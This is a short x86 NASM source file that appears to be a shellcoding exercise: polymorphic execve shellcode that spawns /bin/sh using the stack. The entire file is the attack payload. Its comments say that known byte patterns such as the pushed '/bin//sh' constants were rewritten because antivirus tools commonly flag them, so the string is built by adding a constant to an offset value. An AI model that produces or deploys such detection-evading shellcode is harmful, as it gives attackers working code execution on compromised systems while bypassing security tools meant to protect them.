; Filename: poly.nasm
; Author: Kunal Pachauri
; Website: http://kunalpachauri.co.in
; Purpose: Polymorphic Execve Shellcode using Stack to execute /bin/sh

global _start
section .text

_start:
	; xor eax, eax
	mov ebx, eax
	xor eax, ebx
	

	; push eax
	mov dword [esp-4], eax
	sub esp, 4

	; Need to change these , most common to identify by AV
	; push 0x68732f2f
	; push 0x6e69622f

        ; mov dword [esp-4], 0x68732f2f
	; Changing this too

	mov esi, 0x57621e1e	; Decrese each bit by 1
	add esi, 0x11111111
	mov dword [esp-4], esi

	mov dword [esp-8], 0x6e69622f
	sub esp, 8

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
